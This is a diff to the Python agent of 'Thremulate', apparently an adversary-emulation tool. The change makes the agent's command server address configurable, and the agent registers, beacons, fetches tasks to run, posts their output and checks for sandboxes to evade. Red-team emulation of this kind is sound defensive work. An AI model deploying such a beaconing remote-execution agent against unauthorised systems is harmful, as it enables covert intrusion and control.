@@ -28,6 +28,10 @@ SERVER_IP = ''
 
 
 def agent_arguments():
+    """
+    Obtain the server IP and beacon interval for Agent.
+    :return:
+    """
     global SERVER_IP
     global INTERVAL
     parser = argparse.ArgumentParser()
@@ -174,7 +178,7 @@ def register():
     Registers the Agent with the server.
     :return:
     """
-    url = 'https://localhost:8000/register_agent'
+    url = 'https://{0}:8000/register_agent'.format(SERVER_IP)
 
     try:
         req = http.request('POST', url, fields={'id': agent_id, 'hostname': platform.node(), 'platform': get_platform(),
@@ -195,7 +199,7 @@ def get_techniques():
     :return:
     """
     try:
-        url = ('https://localhost:8000/agent_techniques/%s' % agent_id)
+        url = 'https://{0}:8000/agent_techniques/{1}'.format(SERVER_IP, agent_id)
         req = http.request('GET', url, headers=headers)
         response = str(req.data.decode('utf-8'))
 
@@ -223,7 +227,8 @@ def download_and_run_commands():
     :return:
     """
     try:
-        url = ('https://localhost:8000/agent_tasks/%s' % agent_id)
+        # url = ('https://%s:8000/agent_tasks/%s' % SERVER_IP % agent_id)
+        url = 'https://{0}:8000/agent_tasks/{1}'.format(SERVER_IP, agent_id)
         req = http.request('GET', url, headers=headers)
         response = str(req.data.decode('utf-8'))
 
@@ -254,7 +259,7 @@ def send_output():
     :return:
     """
     std_out = download_and_run_commands()
-    # url = 'https://localhost:8000/agent_tasks/5'
+    # url = 'https://%s:8000/agent_tasks/5' % SERVER_IP
 
     if std_out is None:
         print('[+] Failed to get techniques from the server')
@@ -264,7 +269,7 @@ def send_output():
         return
 
     agent_tech = get_techniques()
-    # https://localhost:8000/agent_techniques/5
+    # https://%s:8000/agent_techniques/5 % SERVER_IP
 
     if agent_tech is None:
         # print('[+] Failed to get techniques from the server')
@@ -273,7 +278,7 @@ def send_output():
         print('[+] No techniques assigned')
         return
 
-    url = 'https://localhost:8000/agent_output'
+    url = 'https://{0}:8000/agent_output'.format(SERVER_IP)
 
     # Iterates over list of techniques assigned to an agent_tasks while selecting the respective
     # result or output after executing that technique
@@ -323,14 +328,6 @@ def confirm_kill():
             os.remove(THIS_DIR / 'thremulate.crt')
 
 
-# def form():
-#     url = 'https://localhost:8000/campaign_delete'
-#
-#     req = http.request('POST', url, fields={'id': 6}, headers=headers)
-#     response = str(req.data.decode('utf-8'))
-#     print('Response code: ' + str(req.status))
-#     print('Response: ' + response)
-
 def sandbox_evasion():
     """
     Checks if Agent is running in a Sand Box and terminates execution.
@@ -352,31 +349,31 @@ def sandbox_evasion():
 
 
 if __name__ == '__main__':
-    agent_arguments()
-    sandbox_evasion()
-    print('[+] Agent running')
-    check_cert()
-    http = urllib3.PoolManager(ca_certs='thremulate.crt')
-    # Agent obtaining ID and kill date if any.
-    if not os.path.exists(path=THIS_DIR / 'config.ini'):
-        agent_id = randrange(500)
-        register()
-    else:
-        agent_config = configparser.ConfigParser()
-        agent_config.read('config.ini')
-        try:
-            agent_id = agent_config['AGENT']['id']
-            print('[+] Agent already registered')
-        except KeyError:
-            sys.exit('[+] Agent has no ID in config.ini\n[+] Agent Stopped!!')
-        try:
-            kill_date_string = agent_config['AGENT']['kill_date']
-        except KeyError:
-            pass
-    while True:
-        try:
+    try:
+        agent_arguments()
+        sandbox_evasion()
+        print('[+] Agent running')
+        check_cert()
+        http = urllib3.PoolManager(ca_certs='thremulate.crt')
+        # Agent obtaining ID and kill date if any.
+        if not os.path.exists(path=THIS_DIR / 'config.ini'):
+            agent_id = randrange(500)
+            register()
+        else:
+            agent_config = configparser.ConfigParser()
+            agent_config.read('config.ini')
+            try:
+                agent_id = agent_config['AGENT']['id']
+                print('[+] Agent already registered')
+            except KeyError:
+                sys.exit('[+] Agent has no ID in config.ini\n[+] Agent Stopped!!')
+            try:
+                kill_date_string = agent_config['AGENT']['kill_date']
+            except KeyError:
+                pass
+        while True:
             time.sleep(INTERVAL)
             send_output()
             config_file()
-        except KeyboardInterrupt:
-            sys.exit('[+] Agent stopped')
+    except KeyboardInterrupt:
+        sys.exit('[+] Agent stopped')
